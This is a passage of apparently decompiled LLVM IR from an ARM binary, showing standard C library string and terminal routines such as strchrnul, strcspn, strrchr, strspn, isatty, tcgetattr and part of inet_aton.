dec_label_pc_1855c:                               ; preds = %dec_label_pc_18550, %entry
  %v0_18560 = phi i32 [ %v0_185543, %entry ], [ %v1_18550, %dec_label_pc_18550 ]
  %v4_1855c = mul nuw nsw i32 %v1_18534, 256
  %v5_1855c = or i32 %v4_1855c, %v1_18534
  %v4_18564 = mul i32 %v5_1855c, 65536
  %v5_18564 = or i32 %v4_18564, %v5_1855c
  br label %dec_label_pc_18568

dec_label_pc_18568:                               ; preds = %dec_label_pc_18604, %dec_label_pc_185a4, %dec_label_pc_1855c
  %v0_185cc = phi i32 [ %v0_18560, %dec_label_pc_1855c ], [ %v4_18568, %dec_label_pc_185a4 ], [ %v4_18568, %dec_label_pc_18604 ]
  %v1_18568 = inttoptr i32 %v0_185cc to i32*
  %v2_18568 = load i32, i32* %v1_18568, align 4
  %v4_18568 = add i32 %v0_185cc, 4
  %v2_18570 = xor i32 %v2_18568, %v5_18564
  %v2_1857c = add i32 %v2_18568, 2130640639
  %v1_18580 = sub i32 -1, %v2_18568
  %v2_18584 = xor i32 %v2_1857c, %v1_18580
  %v2_18590 = and i32 %v2_18584, -2130640640
  store i32 %v2_18590, i32* @r1, align 4
  %v2_18598 = icmp eq i32 %v2_18590, 0
  br i1 %v2_18598, label %dec_label_pc_185a4, label %dec_label_pc_185ac

dec_label_pc_185a4:                               ; preds = %dec_label_pc_18568
  %v2_18574 = add i32 %v2_18570, 2130640639
  %v1_1858c = sub i32 -1, %v2_18570
  %v2_18594 = xor i32 %v2_18574, %v1_1858c
  %v2_1859c = and i32 %v2_18594, -2130640640
  %v2_185a4 = icmp eq i32 %v2_1859c, 0
  br i1 %v2_185a4, label %dec_label_pc_18568, label %dec_label_pc_185ac

dec_label_pc_185ac:                               ; preds = %dec_label_pc_18568, %dec_label_pc_185a4
  %v2_185ac = inttoptr i32 %v0_185cc to i8*
  %v3_185ac = load i8, i8* %v2_185ac, align 1
  %v4_185ac = zext i8 %v3_185ac to i32
  %v9_185b0 = icmp eq i32 %v4_185ac, %v1_18534
  br i1 %v9_185b0, label %dec_label_pc_18610, label %dec_label_pc_185bc

dec_label_pc_185bc:                               ; preds = %dec_label_pc_185ac
  %v2_185bc = icmp eq i8 %v3_185ac, 0
  br i1 %v2_185bc, label %dec_label_pc_1860c, label %dec_label_pc_185c4

dec_label_pc_185c4:                               ; preds = %dec_label_pc_185bc
  %v1_185c4 = add i32 %v0_185cc, 1
  %v2_185c4 = inttoptr i32 %v1_185c4 to i8*
  %v3_185c4 = load i8, i8* %v2_185c4, align 1
  %v4_185c4 = zext i8 %v3_185c4 to i32
  %v9_185c8 = icmp eq i32 %v4_185c4, %v1_18534
  br i1 %v9_185c8, label %dec_label_pc_18610, label %dec_label_pc_185d4

dec_label_pc_185d4:                               ; preds = %dec_label_pc_185c4
  %v2_185d4 = icmp eq i8 %v3_185c4, 0
  br i1 %v2_185d4, label %dec_label_pc_1860c, label %dec_label_pc_185dc

dec_label_pc_185dc:                               ; preds = %dec_label_pc_185d4
  %v1_185dc = add i32 %v0_185cc, 2
  %v2_185dc = inttoptr i32 %v1_185dc to i8*
  %v3_185dc = load i8, i8* %v2_185dc, align 1
  %v4_185dc = zext i8 %v3_185dc to i32
  %v9_185e0 = icmp eq i32 %v4_185dc, %v1_18534
  br i1 %v9_185e0, label %dec_label_pc_18610, label %dec_label_pc_185ec

dec_label_pc_185ec:                               ; preds = %dec_label_pc_185dc
  %v2_185ec = icmp eq i8 %v3_185dc, 0
  br i1 %v2_185ec, label %dec_label_pc_1860c, label %dec_label_pc_185f4

dec_label_pc_185f4:                               ; preds = %dec_label_pc_185ec
  %v1_185f4 = add i32 %v0_185cc, 3
  %v2_185f4 = inttoptr i32 %v1_185f4 to i8*
  %v3_185f4 = load i8, i8* %v2_185f4, align 1
  %v4_185f4 = zext i8 %v3_185f4 to i32
  %v9_185f8 = icmp eq i32 %v4_185f4, %v1_18534
  br i1 %v9_185f8, label %dec_label_pc_18610, label %dec_label_pc_18604

dec_label_pc_18604:                               ; preds = %dec_label_pc_185f4
  %v2_18604 = icmp eq i8 %v3_185f4, 0
  br i1 %v2_18604, label %dec_label_pc_1860c, label %dec_label_pc_18568

dec_label_pc_1860c:                               ; preds = %dec_label_pc_18548, %dec_label_pc_18604, %dec_label_pc_185ec, %dec_label_pc_185d4, %dec_label_pc_185bc
  br label %dec_label_pc_18610

dec_label_pc_18610:                               ; preds = %dec_label_pc_1853c, %dec_label_pc_185f4, %dec_label_pc_185dc, %dec_label_pc_185c4, %dec_label_pc_185ac, %dec_label_pc_1860c
  %v1_18614 = phi i32 [ 0, %dec_label_pc_1860c ], [ %v1_185f4, %dec_label_pc_185f4 ], [ %v1_185dc, %dec_label_pc_185dc ], [ %v1_185c4, %dec_label_pc_185c4 ], [ %v0_185cc, %dec_label_pc_185ac ], [ %v0_18550, %dec_label_pc_1853c ]
  ret i32 %v1_18614

; uselistorder directives
  uselistorder i32 %v4_18568, { 1, 0 }
  uselistorder i32 %v2_18568, { 0, 2, 1 }
  uselistorder i32 %v0_185cc, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_1855c, { 1, 0 }
  uselistorder i32 %v1_18550, { 1, 0, 2 }
  uselistorder i32 %v0_185543, { 2, 1, 0 }
  uselistorder i32 %v1_18534, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_18610, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1860c, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_185ac, { 1, 0 }
  uselistorder label %dec_label_pc_1853c, { 1, 0 }
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_18624 = urem i32 %arg1, 256
  %v0_186442 = load i32, i32* @r0, align 4
  %v1_186443 = urem i32 %v0_186442, 4
  %v2_186444 = icmp eq i32 %v1_186443, 0
  br i1 %v2_186444, label %dec_label_pc_1864c, label %dec_label_pc_1862c

dec_label_pc_1862c:                               ; preds = %entry, %dec_label_pc_18640
  %v0_18640 = phi i32 [ %v1_18640, %dec_label_pc_18640 ], [ %v0_186442, %entry ]
  %v1_1862c = inttoptr i32 %v0_18640 to i8*
  %v2_1862c = load i8, i8* %v1_1862c, align 1
  %v3_1862c = zext i8 %v2_1862c to i32
  %v9_18630 = icmp eq i32 %v3_1862c, %v1_18624
  br i1 %v9_18630, label %dec_label_pc_186fc, label %dec_label_pc_18638

dec_label_pc_18638:                               ; preds = %dec_label_pc_1862c
  %v2_18638 = icmp eq i8 %v2_1862c, 0
  br i1 %v2_18638, label %dec_label_pc_186fc, label %dec_label_pc_18640

dec_label_pc_18640:                               ; preds = %dec_label_pc_18638
  %v1_18640 = add i32 %v0_18640, 1
  %v1_18644 = urem i32 %v1_18640, 4
  %v2_18644 = icmp eq i32 %v1_18644, 0
  br i1 %v2_18644, label %dec_label_pc_1864c, label %dec_label_pc_1862c

dec_label_pc_1864c:                               ; preds = %dec_label_pc_18640, %entry
  %v0_18650 = phi i32 [ %v0_186442, %entry ], [ %v1_18640, %dec_label_pc_18640 ]
  %v4_1864c = mul nuw nsw i32 %v1_18624, 256
  %v5_1864c = or i32 %v4_1864c, %v1_18624
  %v4_18654 = mul i32 %v5_1864c, 65536
  %v5_18654 = or i32 %v4_18654, %v5_1864c
  br label %dec_label_pc_18658

dec_label_pc_18658:                               ; preds = %dec_label_pc_186f4, %dec_label_pc_18694, %dec_label_pc_1864c
  %v0_186bc = phi i32 [ %v0_18650, %dec_label_pc_1864c ], [ %v4_18658, %dec_label_pc_18694 ], [ %v4_18658, %dec_label_pc_186f4 ]
  %v1_18658 = inttoptr i32 %v0_186bc to i32*
  %v2_18658 = load i32, i32* %v1_18658, align 4
  %v4_18658 = add i32 %v0_186bc, 4
  %v2_18660 = xor i32 %v2_18658, %v5_18654
  %v2_1866c = add i32 %v2_18658, 2130640639
  %v1_18670 = sub i32 -1, %v2_18658
  %v2_18674 = xor i32 %v2_1866c, %v1_18670
  %v2_18680 = and i32 %v2_18674, -2130640640
  store i32 %v2_18680, i32* @r1, align 4
  %v2_18688 = icmp eq i32 %v2_18680, 0
  br i1 %v2_18688, label %dec_label_pc_18694, label %dec_label_pc_1869c

dec_label_pc_18694:                               ; preds = %dec_label_pc_18658
  %v2_18664 = add i32 %v2_18660, 2130640639
  %v1_1867c = sub i32 -1, %v2_18660
  %v2_18684 = xor i32 %v2_18664, %v1_1867c
  %v2_1868c = and i32 %v2_18684, -2130640640
  %v2_18694 = icmp eq i32 %v2_1868c, 0
  br i1 %v2_18694, label %dec_label_pc_18658, label %dec_label_pc_1869c

dec_label_pc_1869c:                               ; preds = %dec_label_pc_18658, %dec_label_pc_18694
  %v2_1869c = inttoptr i32 %v0_186bc to i8*
  %v3_1869c = load i8, i8* %v2_1869c, align 1
  %v4_1869c = zext i8 %v3_1869c to i32
  %v9_186a0 = icmp eq i32 %v4_1869c, %v1_18624
  br i1 %v9_186a0, label %dec_label_pc_186fc, label %dec_label_pc_186ac

dec_label_pc_186ac:                               ; preds = %dec_label_pc_1869c
  %v2_186ac = icmp eq i8 %v3_1869c, 0
  br i1 %v2_186ac, label %dec_label_pc_186fc, label %dec_label_pc_186b4

dec_label_pc_186b4:                               ; preds = %dec_label_pc_186ac
  %v1_186b4 = add i32 %v0_186bc, 1
  %v2_186b4 = inttoptr i32 %v1_186b4 to i8*
  %v3_186b4 = load i8, i8* %v2_186b4, align 1
  %v4_186b4 = zext i8 %v3_186b4 to i32
  %v9_186b8 = icmp eq i32 %v4_186b4, %v1_18624
  br i1 %v9_186b8, label %dec_label_pc_186fc, label %dec_label_pc_186c4

dec_label_pc_186c4:                               ; preds = %dec_label_pc_186b4
  %v2_186c4 = icmp eq i8 %v3_186b4, 0
  br i1 %v2_186c4, label %dec_label_pc_186fc, label %dec_label_pc_186cc

dec_label_pc_186cc:                               ; preds = %dec_label_pc_186c4
  %v1_186cc = add i32 %v0_186bc, 2
  %v2_186cc = inttoptr i32 %v1_186cc to i8*
  %v3_186cc = load i8, i8* %v2_186cc, align 1
  %v4_186cc = zext i8 %v3_186cc to i32
  %v9_186d0 = icmp eq i32 %v4_186cc, %v1_18624
  br i1 %v9_186d0, label %dec_label_pc_186fc, label %dec_label_pc_186dc

dec_label_pc_186dc:                               ; preds = %dec_label_pc_186cc
  %v2_186dc = icmp eq i8 %v3_186cc, 0
  br i1 %v2_186dc, label %dec_label_pc_186fc, label %dec_label_pc_186e4

dec_label_pc_186e4:                               ; preds = %dec_label_pc_186dc
  %v1_186e4 = add i32 %v0_186bc, 3
  %v2_186e4 = inttoptr i32 %v1_186e4 to i8*
  %v3_186e4 = load i8, i8* %v2_186e4, align 1
  %v4_186e4 = zext i8 %v3_186e4 to i32
  %v9_186e8 = icmp eq i32 %v4_186e4, %v1_18624
  br i1 %v9_186e8, label %dec_label_pc_186fc, label %dec_label_pc_186f4

dec_label_pc_186f4:                               ; preds = %dec_label_pc_186e4
  %v2_186f4 = icmp eq i8 %v3_186e4, 0
  br i1 %v2_186f4, label %dec_label_pc_186fc, label %dec_label_pc_18658

dec_label_pc_186fc:                               ; preds = %dec_label_pc_18638, %dec_label_pc_1862c, %dec_label_pc_186f4, %dec_label_pc_186e4, %dec_label_pc_186dc, %dec_label_pc_186cc, %dec_label_pc_186c4, %dec_label_pc_186b4, %dec_label_pc_186ac, %dec_label_pc_1869c
  %v1_18700 = phi i32 [ %v1_186e4, %dec_label_pc_186f4 ], [ %v1_186e4, %dec_label_pc_186e4 ], [ %v1_186cc, %dec_label_pc_186dc ], [ %v1_186cc, %dec_label_pc_186cc ], [ %v1_186b4, %dec_label_pc_186c4 ], [ %v1_186b4, %dec_label_pc_186b4 ], [ %v0_186bc, %dec_label_pc_186ac ], [ %v0_186bc, %dec_label_pc_1869c ], [ %v0_18640, %dec_label_pc_1862c ], [ %v0_18640, %dec_label_pc_18638 ]
  ret i32 %v1_18700

; uselistorder directives
  uselistorder i32 %v4_18658, { 1, 0 }
  uselistorder i32 %v2_18658, { 0, 2, 1 }
  uselistorder i32 %v0_186bc, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_1864c, { 1, 0 }
  uselistorder i32 %v1_18640, { 1, 0, 2 }
  uselistorder i32 %v0_186442, { 2, 1, 0 }
  uselistorder i32 %v1_18624, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 2130640639, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_186fc, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_1869c, { 1, 0 }
  uselistorder label %dec_label_pc_1862c, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_1870c = load i32, i32* @r4, align 4
  store i32 %v3_1870c, i32* %stack_var_-16, align 4
  %v6_1870c = load i32, i32* @r5, align 4
  %v9_1870c = load i32, i32* @r6, align 4
  %v0_18710 = load i32, i32* @r0, align 4
  %v0_18714 = load i32, i32* @r1, align 4
  store i32 %v0_18714, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_187308 = inttoptr i32 %v0_18710 to i8*
  %v2_187309 = load i8, i8* %v1_187308, align 1
  %v3_1873010 = zext i8 %v2_187309 to i32
  store i32 %v3_1873010, i32* @r1, align 4
  %v2_1873411 = icmp eq i8 %v2_187309, 0
  store i32 %v0_18714, i32* @r0, align 4
  %v1_1873c12 = add i32 %v0_18710, 1
  store i32 %v1_1873c12, i32* @r4, align 4
  br i1 %v2_1873411, label %dec_label_pc_18744, label %dec_label_pc_18720

dec_label_pc_18720:                               ; preds = %entry, %dec_label_pc_1872c
  %v3_1873014 = phi i32 [ %v3_18730, %dec_label_pc_1872c ], [ %v3_1873010, %entry ]
  %v0_1873813 = phi i32 [ %v0_18738.pre, %dec_label_pc_1872c ], [ %v0_18714, %entry ]
  %v2_18720 = call i32 @__GI_strchr(i32 %v0_1873813, i32 %v3_1873014)
  %v2_18724 = icmp eq i32 %v2_18720, 0
  %v0_1872c = load i32, i32* @r5, align 4
  br i1 %v2_18724, label %dec_label_pc_1872c, label %dec_label_pc_18744

dec_label_pc_1872c:                               ; preds = %dec_label_pc_18720
  %v1_1872c = add i32 %v0_1872c, 1
  %v0_18730.pre = load i32, i32* @r4, align 4
  %v0_18738.pre = load i32, i32* @r6, align 4
  store i32 %v1_1872c, i32* @r5, align 4
  %v1_18730 = inttoptr i32 %v0_18730.pre to i8*
  %v2_18730 = load i8, i8* %v1_18730, align 1
  %v3_18730 = zext i8 %v2_18730 to i32
  store i32 %v3_18730, i32* @r1, align 4
  %v2_18734 = icmp eq i8 %v2_18730, 0
  store i32 %v0_18738.pre, i32* @r0, align 4
  %v1_1873c = add i32 %v0_18730.pre, 1
  store i32 %v1_1873c, i32* @r4, align 4
  br i1 %v2_18734, label %dec_label_pc_18744, label %dec_label_pc_18720

dec_label_pc_18744:                               ; preds = %dec_label_pc_1872c, %dec_label_pc_18720, %entry
  %v0_18744 = phi i32 [ 0, %entry ], [ %v0_1872c, %dec_label_pc_18720 ], [ %v1_1872c, %dec_label_pc_1872c ]
  %v2_18748 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18748, i32* @r4, align 4
  store i32 %v6_1870c, i32* @r5, align 4
  store i32 %v9_1870c, i32* @r6, align 4
  ret i32 %v0_18744

; uselistorder directives
  uselistorder i32 %v3_18730, { 1, 0 }
  uselistorder i32 %v0_18738.pre, { 1, 0 }
  uselistorder i32 %v0_18730.pre, { 1, 0 }
  uselistorder label %dec_label_pc_18720, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_18754 = urem i32 %arg2, 256
  store i32 %v1_18754, i32* @r4, align 4
  %v2_18754 = icmp eq i32 %v1_18754, 0
  br i1 %v2_18754, label %dec_label_pc_18768, label %dec_label_pc_1877c.preheader

dec_label_pc_1877c.preheader:                     ; preds = %entry
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_187843 = call i32 @__GI_strchr(i32 %arg1, i32 %v1_18754)
  %v2_187885 = icmp eq i32 %v2_187843, 0
  br i1 %v2_187885, label %dec_label_pc_18790, label %dec_label_pc_18774

dec_label_pc_18768:                               ; preds = %entry
  %v2_1876c = call i32 @__GI_strchr(i32 %arg1, i32 0)
  br label %dec_label_pc_18794

dec_label_pc_18774:                               ; preds = %dec_label_pc_1877c.preheader, %dec_label_pc_18774
  %v2_187846 = phi i32 [ %v2_18784, %dec_label_pc_18774 ], [ %v2_187843, %dec_label_pc_1877c.preheader ]
  store i32 %v2_187846, i32* @r5, align 4
  %v1_18778 = add i32 %v2_187846, 1
  store i32 %v1_18778, i32* @r0, align 4
  %v0_18780 = load i32, i32* @r4, align 4
  %v2_18784 = call i32 @__GI_strchr(i32 %v1_18778, i32 %v0_18780)
  %v2_18788 = icmp eq i32 %v2_18784, 0
  br i1 %v2_18788, label %dec_label_pc_18790, label %dec_label_pc_18774

dec_label_pc_18790:                               ; preds = %dec_label_pc_18774, %dec_label_pc_1877c.preheader
  %v0_18790 = load i32, i32* @r5, align 4
  br label %dec_label_pc_18794

dec_label_pc_18794:                               ; preds = %dec_label_pc_18768, %dec_label_pc_18790
  %storemerge = phi i32 [ %v2_1876c, %dec_label_pc_18768 ], [ %v0_18790, %dec_label_pc_18790 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_18784, { 1, 0 }
  uselistorder i32 %v1_18778, { 1, 0 }
  uselistorder i32 %v1_18754, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_18794, { 1, 0 }
  uselistorder label %dec_label_pc_18774, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v0_187d02 = load i32, i32* @r0, align 4
  %v1_187d03 = inttoptr i32 %v0_187d02 to i8*
  %v2_187d04 = load i8, i8* %v1_187d03, align 1
  %v2_187d46 = icmp eq i8 %v2_187d04, 0
  br i1 %v2_187d46, label %dec_label_pc_187e0, label %dec_label_pc_187b4.preheader

dec_label_pc_187ac:                               ; preds = %dec_label_pc_187b4
  %v1_187bc = add i32 %v0_187bc, 1
  %v9_187ac = icmp eq i8 %v0_187ac10.in, %v2_187b4
  br i1 %v9_187ac, label %dec_label_pc_187c8, label %dec_label_pc_187b4

dec_label_pc_187b4:                               ; preds = %dec_label_pc_187b4.preheader, %dec_label_pc_187ac
  %v0_187bc = phi i32 [ %tmp, %dec_label_pc_187b4.preheader ], [ %v1_187bc, %dec_label_pc_187ac ]
  %v1_187b4 = inttoptr i32 %v0_187bc to i8*
  %v2_187b4 = load i8, i8* %v1_187b4, align 1
  %v2_187b8 = icmp eq i8 %v2_187b4, 0
  br i1 %v2_187b8, label %dec_label_pc_187e0, label %dec_label_pc_187ac

dec_label_pc_187c8:                               ; preds = %dec_label_pc_187ac
  %v1_187c8 = add i32 %v0_187c8, 1
  %v1_187cc = add i32 %v0_187cc, 1
  %v1_187d0 = inttoptr i32 %v1_187cc to i8*
  %v2_187d0 = load i8, i8* %v1_187d0, align 1
  %v2_187d4 = icmp eq i8 %v2_187d0, 0
  br i1 %v2_187d4, label %dec_label_pc_187e0, label %dec_label_pc_187b4.preheader

dec_label_pc_187b4.preheader:                     ; preds = %entry, %dec_label_pc_187c8
  %v0_187cc = phi i32 [ %v1_187cc, %dec_label_pc_187c8 ], [ %v0_187d02, %entry ]
  %v0_187c8 = phi i32 [ %v1_187c8, %dec_label_pc_187c8 ], [ 0, %entry ]
  %v0_187ac10.in = phi i8 [ %v2_187d0, %dec_label_pc_187c8 ], [ %v2_187d04, %entry ]
  br label %dec_label_pc_187b4

dec_label_pc_187e0:                               ; preds = %dec_label_pc_187c8, %dec_label_pc_187b4, %entry
  %v0_187e0 = phi i32 [ 0, %entry ], [ %v0_187c8, %dec_label_pc_187b4 ], [ %v1_187c8, %dec_label_pc_187c8 ]
  ret i32 %v0_187e0

; uselistorder directives
  uselistorder i8 %v2_187b4, { 1, 0 }
  uselistorder i32 %v0_187bc, { 1, 0 }
  uselistorder label %dec_label_pc_187b4.preheader, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  %v2_187f4 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_187f4, i32* @r1, align 4
  %v0_187f8 = call i32 @__GI_tcgetattr()
  %v1_187fc = sub i32 1, %v0_187f8
  %v2_187fc = icmp ult i32 %v0_187f8, 2
  br i1 %v2_187fc, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v1_1880c = phi i32 [ %v1_187fc, %entry ], [ 0, %bb ]
  ret i32 %v1_1880c

; uselistorder directives
  uselistorder i32 %v0_187f8, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_4()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_18810 = load i32, i32* @r4, align 4
  %v6_18810 = load i32, i32* @r5, align 4
  %v9_18810 = load i32, i32* @r6, align 4
  %v2_18818 = ptrtoint i32* %stack_var_-52 to i32
  %v0_1881c = load i32, i32* @r1, align 4
  store i32 %v0_1881c, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_18828 = load i32, i32* @r0, align 4
  %v3_18828 = call i32 @ioctl(i32 %v0_18828, i32 21505, i32 %v2_18818)
  store i32 %v3_18828, i32* %r0.global-to-local, align 4
  store i32 %v3_18828, i32* @r5, align 4
  %v2_1882c = icmp eq i32 %v3_18828, 0
  br i1 %v2_1882c, label %dec_label_pc_18834, label %dec_label_pc_18878

dec_label_pc_18834:                               ; preds = %entry
  %v4_18840 = zext i8 %tmp to i32
  store i32 %v4_18840, i32* @ip, align 4
  %v3_18844 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_18844, i32* @r3, align 4
  %v1_18848 = load i32, i32* @r4, align 4
  %v2_18848 = add i32 %v1_18848, 4
  %v3_18848 = inttoptr i32 %v2_18848 to i32*
  %v0_1884c = load i32, i32* %r1.global-to-local, align 4
  %v1_1884c = load i32, i32* @r4, align 4
  %v2_1884c = add i32 %v1_1884c, 8
  %v3_1884c = inttoptr i32 %v2_1884c to i32*
  store i32 %v0_1884c, i32* %v3_1884c, align 4
  %v0_18850 = load i32, i32* %r0.global-to-local, align 4
  %v1_18850 = load i32, i32* @r4, align 4
  %v2_18850 = add i32 %v1_18850, 12
  %v3_18850 = inttoptr i32 %v2_18850 to i32*
  store i32 %v0_18850, i32* %v3_18850, align 4
  %v2_18854 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_18854, i32* @r1, align 4
  %v1_1885c = load i32, i32* @r4, align 4
  %v2_1885c = inttoptr i32 %v1_1885c to i32*
  store i32 %v3_18844, i32* %v2_1885c, align 4
  %v0_18860 = load i32, i32* @ip, align 4
  %v1_18860 = trunc i32 %v0_18860 to i8
  %v2_18860 = load i32, i32* @r4, align 4
  %v3_18860 = add i32 %v2_18860, 16
  %v4_18860 = inttoptr i32 %v3_18860 to i8*
  store i8 %v1_18860, i8* %v4_18860, align 1
  %v0_18864 = load i32, i32* @r4, align 4
  %v1_18864 = add i32 %v0_18864, 17
  store i32 %v1_18864, i32* %r0.global-to-local, align 4
  %v4_18868 = call i32 @__GI_mempcpy(i32 %v1_18864, i32 %v2_18854, i32 19, i32 %v3_18844)
  store i32 %v4_18868, i32* %r0.global-to-local, align 4
  %v0_1886c = load i32, i32* @r5, align 4
  store i32 %v0_1886c, i32* %r1.global-to-local, align 4
  %v3_18874 = inttoptr i32 %v4_18868 to i8*
  %v4_18874 = call i32 @__GI_memset(i8* %v3_18874, i32 %v0_1886c, i32 13)
  store i32 %v4_18874, i32* %r0.global-to-local, align 4
  %v0_18878.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18878

dec_label_pc_18878:                               ; preds = %entry, %dec_label_pc_18834
  %v0_18878 = phi i32 [ %v3_18828, %entry ], [ %v0_18878.pre, %dec_label_pc_18834 ]
  store i32 %v0_18878, i32* %r0.global-to-local, align 4
  store i32 %v3_18810, i32* @r4, align 4
  store i32 %v6_18810, i32* @r5, align 4
  store i32 %v9_18810, i32* @r6, align 4
  ret i32 %v0_18878

; uselistorder directives
  uselistorder i32 %v0_18878, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 17, { 11, 1, 2, 12, 13, 3, 14, 4, 15, 5, 16, 6, 17, 18, 19, 7, 20, 8, 9, 21, 10, 22, 23, 24, 0 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18878, { 1, 0 }
}

define i32 @inet_aton() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1888c = load i32, i32* @r4, align 4
  store i32 %v3_1888c, i32* %stack_var_-28, align 4
  %v0_18894 = load i32, i32* @r0, align 4
  %v2_18894 = icmp eq i32 %v0_18894, 0
  %v0_1889c = load i32, i32* @r1, align 4
  br i1 %v2_18894, label %dec_label_pc_18970, label %dec_label_pc_188a4

dec_label_pc_188a4:                               ; preds = %entry
  br label %dec_label_pc_188bc

dec_label_pc_188bc:                               ; preds = %dec_label_pc_188a4, %dec_label_pc_18934
  %v1_18934 = phi i32 [ 0, %dec_label_pc_188a4 ], [ %v5_18934, %dec_label_pc_18934 ]
  %v0_18938 = phi i32 [ 1, %dec_label_pc_188a4 ], [ %v1_18938, %dec_label_pc_18934 ]
  %v0_188bc = phi i32 [ %v0_18894, %dec_label_pc_188a4 ], [ %v0_188bc13, %dec_label_pc_18934 ]
  %v1_188bc = inttoptr i32 %v0_188bc to i8*
  %v2_188bc = load i8, i8* %v1_188bc, align 1
  %v3_188bc = zext i8 %v2_188bc to i32
  %v4_188c0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 276) to i32*), align 4
  %v2_188c4 = mul nuw nsw i32 %v3_188bc, 2
  %v2_188c8 = add i32 %v2_188c4, %v4_188c0
  %v3_188c8 = inttoptr i32 %v2_188c8 to i16*
  %v4_188c8 = load i16, i16* %v3_188c8, align 2
  %v1_188cc = and i16 %v4_188c8, 8
  %v2_188cc = icmp eq i16 %v1_188cc, 0
  br i1 %v2_188cc, label %dec_label_pc_18970, label %dec_label_pc_188d4

dec_label_pc_188d4:                               ; preds = %dec_label_pc_188bc
  br label %dec_label_pc_188f4

dec_label_pc_188dc:                               ; preds = %dec_label_pc_188f4
  %v2_188dc = mul i32 %v0_18934, 10
  %v1_188e0 = add i32 %v2_188dc, -48
  %v2_188e4 = add i32 %v3_188f4, %v1_188e0
  %v8_188ec = icmp sgt i32 %v2_188e4, 255
  br i1 %v8_188ec, label %dec_label_pc_18970, label %dec_label_pc_188f0

dec_label_pc_188f0:                               ; preds = %dec_label_pc_188dc
  %v1_188f0 = add i32 %v0_18924, 1
  store i32 %v1_188f0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_188f4

dec_label_pc_188f4:                               ; preds = %dec_label_pc_188d4, %dec_label_pc_188f0
  %v0_18934 = phi i32 [ 0, %dec_label_pc_188d4 ], [ %v2_188e4, %dec_label_pc_188f0 ]
  %v0_18924 = phi i32 [ %v0_188bc, %dec_label_pc_188d4 ], [ %v1_188f0, %dec_label_pc_188f0 ]
  %v1_188f4 = inttoptr i32 %v0_18924 to i8*
  %v2_188f4 = load i8, i8* %v1_188f4, align 1
  %v3_188f4 = zext i8 %v2_188f4 to i32
  %v2_188f8 = mul nuw nsw i32 %v3_188f4, 2
  %v2_188fc = add i32 %v2_188f8, %v4_188c0
  %v3_188fc = inttoptr i32 %v2_188fc to i16*
  %v4_188fc = load i16, i16* %v3_188fc, align 2
  %v6_188fc = zext i16 %v4_188fc to i32
  %v1_18900 = and i32 %v6_188fc, 8
  %v2_18900 = icmp eq i32 %v1_18900, 0
  br i1 %v2_18900, label %dec_label_pc_18908, label %dec_label_pc_188dc

dec_label_pc_18908:                               ; preds = %dec_label_pc_188f4
  %v7_18908 = icmp eq i32 %v0_18938, 4
  br i1 %v7_18908, label %dec_label_pc_18920, label %dec_label_pc_18910

dec_label_pc_18910:                               ; preds = %dec_label_pc_18908
  %v7_18910 = icmp eq i8 %v2_188f4, 46
  br i1 %v7_18910, label %dec_label_pc_18918, label %dec_label_pc_18970

dec_label_pc_18918:                               ; preds = %dec_label_pc_18910
  %v1_18918 = add i32 %v0_18924, 1
  store i32 %v1_18918, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18934

dec_label_pc_18920:                               ; preds = %dec_label_pc_18908
  %v2_18920 = icmp eq i8 %v2_188f4, 0
  %v1_18924 = add i32 %v0_18924, 1
  store i32 %v1_18924, i32* %r0.global-to-local, align 4
  br i1 %v2_18920, label %dec_label_pc_18934, label %dec_label_pc_1892c

dec_label_pc_1892c:                               ; preds = %dec_label_pc_18920
  %v1_1892c = and i32 %v6_188fc, 32
